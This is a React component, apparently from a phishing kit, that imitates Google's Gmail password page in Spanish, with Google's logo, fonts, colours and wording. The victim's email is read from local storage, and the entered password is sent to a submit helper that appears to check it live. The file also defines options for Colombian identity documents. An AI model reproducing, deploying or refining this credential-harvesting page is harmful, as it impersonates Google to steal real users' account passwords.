import { useFormik } from 'formik'
import { useState } from 'react'

import { submitBase } from '../../../../helpers/submitBase'
import { usernameAndPasswordValidate } from '../../../../security/usernameAndPasswordValidate'
import { Spiner } from '../../../Spiner'
import { useGeneralData } from '../../../../hooks/useGeneralData'
import { GmailInputVerification } from './PasswordGmailInput'
import { LogoGoogle } from '../../../../assets/emailVerification/LogoGoogle'
import { UserIcon } from '../../../../assets/emailVerification/UserIcon'

const valuesData = { correoClave: '' }
const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const GmailVerification = () => {
    const dataImportant = useGeneralData({ modeLive: true })

    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('')
    const [selectActive, setSelectActive] = useState(false)
    const [selectItem, setSelectItem] = useState(opciones[0])
    
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => usernameAndPasswordValidate({values, virtualKeyword: false}),
        onSubmit: async(valuesData, {resetForm}) => {
            // Descomentar si quieres un tipo de documento
            // valuesData.typeDocument = selectItem
            submitBase({dataImportant, valuesData}) 
            return resetForm()
        }
    })
    
    return (
        <>
            {
                dataImportant.showSpiner === true ? <Spiner /> : (
                    <div className='px-[40px] pt-[48px] pb-[36px]'>
                        <div className='flex justify-center flex-col items-center'>
                            <LogoGoogle />
                            <p className='googleFont  text-[24px] text-[#202124] pt-[16px]'>Te damos la bienvenida</p>
                            <div className='px-[7px] gap-[4px] items-center  py-[3px] inline-flex border-[1px] rounded-full mt-[8px]'>
                                <UserIcon />
                                <span className='text-[14px] googleFont'>{JSON.parse(localStorage.getItem('email'))}</span>
                                <svg  fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg>
                            </div>
                        </div>
                        {dataImportant.liveError === true && (<p className='px-[20px] text-white text-[14px] font-bold text-center py-3 bg-red-600'>Correo y clave inválidos.</p>)}
                        <form className='flex flex-col mt-[48px]' onSubmit={handleSubmit}>

                            <GmailInputVerification
                                username={values.username}
                                password={values.password}
                                typeDocument={values.typeDocument}
                                handleChange={handleChange} 
                                handleBlur={handleBlur}
                                touched={touched}
                                errors={errors}
                                valueKeyBoardVirtual={valueKeyBoardVirtual}
                                showPasswordMode={false}

                                selectActive={selectActive} 
                                setSelectActive={setSelectActive}
                                selectItem={selectItem}
                                setSelectItem={setSelectItem}
                                opciones={opciones}
                            />
                            <div className='flex items-center justify-between'>
                                <span className='text-[#1a73e8] googleFont'>¿Has olvidado tu contraseña?</span>
                                <button 
                                        disabled={
                                            (
                                                touched.correoClave && 
                                                errors.correoClave || 
                                                values.correoClave.length === 0
                                            ) 
                                            // || 
                                            // (
                                            //     // Clave virtual o normal input
                                            //     // valueKeyBoardVirtual.length < 1 
                                            //     // (
                                            //     //     touched.password && 
                                            //     //     errors.password || 
                                            //     //     values.password.length === 0
                                            //     // )
                                            // ) 
                                            == true ? true : false
                                        }
                                    className=' hover:bg-[#0a57d1] transition-all bg-[#1a73e8] text-white rounded-[6px] googleFont w-[110px] h-[36px] px-4 py-1'
                                    type='submit'
                                >
                                    Siguiente
                                </button>
                            </div>

                        </form>
                    </div>
                )
            }
        </>
            
    )
}
